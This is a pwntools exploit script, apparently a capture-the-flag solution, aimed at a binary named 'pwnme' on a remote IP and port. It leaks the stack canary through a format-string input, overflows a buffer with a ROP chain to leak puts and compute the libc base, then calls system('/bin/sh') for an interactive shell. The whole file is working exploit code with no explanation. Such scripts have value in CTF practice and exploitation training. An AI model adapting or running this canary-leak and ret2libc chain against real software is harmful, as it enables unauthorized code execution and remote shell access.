#!/usr/bin/python3

from pwn import *
import subprocess

# libc = ELF('./libc6_2.23-0ubuntu11.2_amd64.so', checksec=False)
libc = ELF('./libc6_2.23-0ubuntu11.3_amd64.so', checksec=False)
context.binary = exe = ELF('./pwnme', checksec=False)
context.log_level = 'debug'

def GDB():
    command = '''
    b*0x4012e9
    b*0x40130d
    b*0x0000000000401338
    c
    '''
    with open('/tmp/command.gdb', 'wt') as f:
        f.write(command)
    subprocess.Popen(['/usr/bin/x-terminal-emulator', '--geometry', '960x1080+960+0', '-e', 'gdb', '-p', str(p.pid), '-x', '/tmp/command.gdb'])
    input()         # input() to make program wait with gdb

# p = process('./pwnme_patched')
p = remote('139.180.134.15', 7333)

p.sendlineafter(b'name?', b'%p'*16)
p.recvline()
canary = int(p.recvuntil("What", drop=True).split(b'0x')[-1], 16)
log.info(hex(canary))


pop_rdi = 0x00000000004013a3
pop_rsi_r15 = 0x00000000004013a1
payload = b'A'*0x48 + p64(canary) + b'B'*8
payload += flat(
    pop_rdi,
    exe.got['puts'],
    exe.plt['puts'],
    exe.sym['main'])
p.sendlineafter(b'event:', payload)

# GDB()
p.recvline()
p.recvline()
puts_addr = u64(p.recvline()[:-1] + b'\x00\x00')
log.info(hex(puts_addr))
libc.address = puts_addr - libc.sym['puts']
log.info(hex(libc.address))

p.sendlineafter(b'name?', b'ABCD')
payload = b'A'*0x48 + p64(canary) + b'B'*8
payload += flat(
    pop_rsi_r15,
    0,
    0,
    pop_rdi,
    next(libc.search(b'/bin/sh')),
    libc.sym['system'])
p.sendlineafter(b'event:', payload)

p.interactive()